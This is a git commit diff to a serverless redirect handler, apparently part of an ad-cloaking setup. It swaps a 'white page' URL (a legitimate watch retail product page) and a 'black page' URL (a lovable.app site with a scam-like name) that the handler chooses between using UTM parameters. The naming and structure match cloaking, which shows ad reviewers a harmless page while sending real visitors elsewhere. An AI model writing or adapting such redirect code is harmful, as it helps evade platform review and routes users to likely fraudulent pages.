567528a333556db681e84fd6063e454af3699cd7
abdullahch3332 <abdullahch3332@gmail.com>
2025-11-11 19:38:21 +0500

    Update redirect.js

--- api/redirect.js
+++ api/redirect.js
@@ -1,7 +1,7 @@
 export default function handler(req, res) {
     // URLs to redirect
-    const whitePageURL = "https://chasevalue.pk/products/newborn-boys-full-sleeves-suit-chase-value-a210876-a-orange-1?variant=42124766773325";
-    const blackPageURL = "https://instentquzzz.lovable.app/";
+    const whitePageURL = "https://www.vaerwatches.com/products/s3-tradition-tan-36mm-quartz";
+    const blackPageURL = "https://ubuzznotifier.lovable.app/";
   
     // Parse the UTM parameters from the request URL
     const queryParams = new URLSearchParams(req.url.split('?')[1]);
@@ -26,6 +26,7 @@ export default function handler(req, res) {
     res.end();
 
   }
+
 
 
 
